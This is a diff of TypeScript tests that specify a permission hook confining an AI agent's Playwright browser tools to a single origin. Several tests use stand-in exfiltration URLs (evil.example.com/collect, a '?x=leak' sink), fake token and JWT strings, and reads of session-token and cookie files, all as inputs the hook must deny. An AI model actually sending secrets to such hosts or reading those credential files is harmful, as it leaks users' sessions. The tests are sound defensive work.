@@ -313,3 +313,164 @@ describe("tokenizer / splitter primitives", () => {
     expect(splitSegments("a && b ; c || d")).toEqual(["a", "b", "c", "d"]);
   });
 });
+
+// =============================================================================
+// File-driven per-cron mcp__playwright__* relaxation (#5199, cron-ux-audit).
+// The hook never sees cronName — per-cron MCP policy lives ONLY in the
+// allowlist file (delivered per-cron, itself read-denied via .claude/). These
+// tests are the security spec for the FIRST mcp__* allowance in the containment
+// hook: a global-allow implementation would pass the within-ux-audit positives
+// but FAIL the cross-cron negative.
+// =============================================================================
+
+// cron-ux-audit's allowlist file: issue-creator bash prefixes PLUS the
+// mcp-allow directive lines (5 declared Playwright tools) + the navigate-origin
+// pin. The directive lines are NOT bash prefixes.
+const UX_ALLOW = [
+  "gh issue list",
+  "gh issue create",
+  "gh label list",
+  "gh label create",
+  "mcp-allow mcp__playwright__browser_navigate",
+  "mcp-allow mcp__playwright__browser_take_screenshot",
+  "mcp-allow mcp__playwright__browser_resize",
+  "mcp-allow mcp__playwright__browser_close",
+  "mcp-allow mcp__playwright__browser_wait_for",
+  "navigate-origin https://app.soleur.ai",
+];
+
+const decideWith = (input: unknown, allow: string[] | null) =>
+  decide(input, allow).hookSpecificOutput.permissionDecision;
+const mcpNav = (url: unknown) => ({
+  tool_name: "mcp__playwright__browser_navigate",
+  tool_input: { url },
+});
+const mcpTool = (name: string, input: Record<string, unknown> = {}) => ({
+  tool_name: name,
+  tool_input: input,
+});
+
+describe("mcp-allow — file-driven per-cron Playwright relaxation (#5199)", () => {
+  it("allows a declared browser_navigate to the navigate-origin", () => {
+    expect(decideWith(mcpNav("https://app.soleur.ai/dashboard"), UX_ALLOW)).toBe(
+      "allow",
+    );
+  });
+  it("allows the navigate-origin root path", () => {
+    expect(decideWith(mcpNav("https://app.soleur.ai/"), UX_ALLOW)).toBe("allow");
+  });
+  it("allows the other 4 declared Playwright tools (no URL)", () => {
+    for (const t of [
+      "mcp__playwright__browser_take_screenshot",
+      "mcp__playwright__browser_resize",
+      "mcp__playwright__browser_close",
+      "mcp__playwright__browser_wait_for",
+    ]) {
+      expect(decideWith(mcpTool(t), UX_ALLOW)).toBe("allow");
+    }
+  });
+
+  // --- URL-origin guard (the load-bearing exfil close) ---
+  it("DENIES browser_navigate to an off-origin host (api.soleur.ai exfil sink)", () => {
+    expect(decideWith(mcpNav("https://api.soleur.ai/?x=leak"), UX_ALLOW)).toBe(
+      "deny",
+    );
+  });
+  it("DENIES browser_navigate to an arbitrary external origin", () => {
+    expect(decideWith(mcpNav("https://evil.example.com/collect"), UX_ALLOW)).toBe(
+      "deny",
+    );
+  });
+  it("DENIES a secret-bearing query string even to the allowed origin", () => {
+    expect(
+      decideWith(
+        mcpNav("https://app.soleur.ai/x?t=ghp_0123456789abcdefghij0123"),
+        UX_ALLOW,
+      ),
+    ).toBe("deny");
+  });
+  it("DENIES a JWT-shaped secret in the fragment of the allowed origin", () => {
+    expect(
+      decideWith(
+        mcpNav("https://app.soleur.ai/x#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc"),
+        UX_ALLOW,
+      ),
+    ).toBe("deny");
+  });
+  it("DENIES browser_navigate with a missing/invalid URL", () => {
+    expect(decideWith(mcpNav(undefined), UX_ALLOW)).toBe("deny");
+    expect(decideWith(mcpNav("not a url"), UX_ALLOW)).toBe("deny");
+  });
+
+  // --- off-list mcp + egress tools stay denied even with an mcp-allow section ---
+  it("DENIES an mcp tool NOT in the allow set (browser_run_code_unsafe)", () => {
+    expect(
+      decideWith(mcpTool("mcp__playwright__browser_run_code_unsafe"), UX_ALLOW),
+    ).toBe("deny");
+  });
+  it("DENIES WebFetch / WebSearch despite the mcp-allow section", () => {
+    expect(
+      decideWith(mcpTool("WebFetch", { url: "https://app.soleur.ai" }), UX_ALLOW),
+    ).toBe("deny");
+    expect(decideWith(mcpTool("WebSearch", { query: "x" }), UX_ALLOW)).toBe("deny");
+  });
+
+  // --- bash surface unaffected; directives are not bash prefixes ---
+  it("still allows the issue-creator bash surface", () => {
+    expect(
+      decideWith(bash("gh issue create --title x --body-file /tmp/b.md"), UX_ALLOW),
+    ).toBe("allow");
+    expect(
+      decideWith(bash("gh issue list --label ux-audit --state all"), UX_ALLOW),
+    ).toBe("allow");
+  });
+  it("does NOT treat a directive line as a bash allow prefix", () => {
+    expect(
+      decideWith(bash("mcp-allow mcp__playwright__browser_navigate"), UX_ALLOW),
+    ).toBe("deny");
+    expect(
+      decideWith(bash("navigate-origin https://evil.example.com"), UX_ALLOW),
+    ).toBe("deny");
+  });
+
+  // --- CROSS-CRON NEGATIVE: the only test that proves scoping is real ---
+  it("DENIES browser_navigate for a cron whose file has NO mcp-allow section (cross-cron)", () => {
+    // ALLOW is the roadmap-review-shaped bash-only allowlist (no mcp directives).
+    expect(decideWith(mcpNav("https://app.soleur.ai/dashboard"), ALLOW)).toBe("deny");
+    expect(
+      decideWith(mcpTool("mcp__playwright__browser_take_screenshot"), ALLOW),
+    ).toBe("deny");
+  });
+});
+
+describe("secret-path read-deny — bot session state (#5199)", () => {
+  // The bot writes live Supabase access/refresh tokens to storage-state.json in
+  // the workspace; tmp/ux-audit/ holds findings + screenshots. A relaxed cron
+  // must not Read the session then encode it into an allowlisted gh/navigate call.
+  for (const tool of ["Read", "Glob", "Grep"]) {
+    it(`DENIES ${tool} of storage-state.json`, () => {
+      expect(
+        decideWith(
+          { tool_name: tool, tool_input: { file_path: "/tmp/x/workspace/storage-state.json" } },
+          UX_ALLOW,
+        ),
+      ).toBe("deny");
+    });
+    it(`DENIES ${tool} under tmp/ux-audit/`, () => {
+      expect(
+        decideWith(
+          { tool_name: tool, tool_input: { file_path: "/var/lib/x/tmp/ux-audit/findings.json" } },
+          UX_ALLOW,
+        ),
+      ).toBe("deny");
+    });
+  }
+  it("DENIES a Read of the playwright-mcp-profile (browser-resident session)", () => {
+    expect(
+      decideWith(
+        { tool_name: "Read", tool_input: { file_path: "/tmp/x/workspace/playwright-mcp-profile/Default/Cookies" } },
+        UX_ALLOW,
+      ),
+    ).toBe("deny");
+  });
+});
